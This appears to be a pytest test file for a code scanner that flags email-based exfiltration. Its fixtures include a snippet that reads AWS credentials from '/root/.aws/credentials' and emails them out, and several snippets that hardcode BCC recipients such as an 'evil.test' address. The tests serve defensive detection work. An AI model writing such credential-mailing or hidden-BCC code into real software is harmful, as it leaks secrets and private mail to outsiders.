"""E-mail/SMTP as an egress channel + hardcoded BCC exfil (ST-EMAIL-BCC-EXFIL)."""

from __future__ import annotations

from pathlib import Path

from skilltotal.collector import detect_component
from skilltotal.engine import analyze_directory
from skilltotal.file_index import FileIndex
from skilltotal.models import Capability
from skilltotal.scanners.email_exfil import EmailExfilScanner


def _analyze(root: Path):
    return analyze_directory(root, detect_component(root, source=str(root)))


def _ids(report) -> set[str]:
    return {f.id for f in report.findings}


# --- Part 1: email-send counts as network egress ---

def test_smtplib_is_network_egress(tmp_path: Path):
    (tmp_path / "m.py").write_text(
        "import smtplib\nsmtplib.SMTP('h').sendmail('a', 'b', 'x')\n",
        encoding="utf-8",
        newline="",
    )
    report = _analyze(tmp_path)
    assert Capability.NETWORK_EGRESS in report.capabilities


def test_nodemailer_is_network_egress(tmp_path: Path):
    (tmp_path / "m.js").write_text(
        "const nodemailer = require('nodemailer');\ntransport.sendMail(msg);\n",
        encoding="utf-8",
        newline="",
    )
    report = _analyze(tmp_path)
    assert Capability.NETWORK_EGRESS in report.capabilities


def test_secret_read_plus_email_is_exfil_combo(tmp_path: Path):
    (tmp_path / "m.py").write_text(
        "import smtplib\n"
        "creds = open('/root/.aws/credentials').read()\n"
        "smtplib.SMTP('h').sendmail('a', 'b', creds)\n",
        encoding="utf-8",
        newline="",
    )
    assert "ST-COMBO-EXFIL" in _ids(_analyze(tmp_path))


# --- Part 2: hardcoded BCC/CC exfil recipient ---

def _scan_email(tmp_path: Path, name: str, content: str) -> set[str]:
    (tmp_path / name).write_text(content, encoding="utf-8", newline="\n")
    return {f.id for f in EmailExfilScanner().scan(FileIndex.build(tmp_path)).findings}


def test_hardcoded_bcc_in_email_file_is_flagged(tmp_path: Path):
    code = (
        "const nodemailer = require('nodemailer');\n"
        "await transport.sendMail({ to, subject, bcc: 'phan@giftshop.club' });\n"
    )
    assert "ST-EMAIL-BCC-EXFIL" in _scan_email(tmp_path, "send.js", code)


def test_quoted_bcc_key_is_flagged(tmp_path: Path):
    code = 'import smtplib\nmsg = {"bcc": "x@evil.test"}\nsmtplib.SMTP("h").send_message(msg)\n'
    assert "ST-EMAIL-BCC-EXFIL" in _scan_email(tmp_path, "m.py", code)


# --- false-positive guards ---

def test_dynamic_bcc_not_flagged(tmp_path: Path):
    code = "const nodemailer=require('nodemailer');\ntransport.sendMail({ bcc: userInput });\n"
    assert "ST-EMAIL-BCC-EXFIL" not in _scan_email(tmp_path, "s.js", code)


def test_from_literal_not_flagged(tmp_path: Path):
    code = "const nodemailer=require('nodemailer');\ntransport.sendMail({ from: 'me@co.com' });\n"
    assert "ST-EMAIL-BCC-EXFIL" not in _scan_email(tmp_path, "s.js", code)


def test_bcc_literal_without_email_send_not_flagged(tmp_path: Path):
    # A bcc literal in a file that doesn't send email is out of scope (not an exfil signal).
    ids = _scan_email(tmp_path, "c.js", "const x = { bcc: 'a@b.com' };\n")
    assert "ST-EMAIL-BCC-EXFIL" not in ids
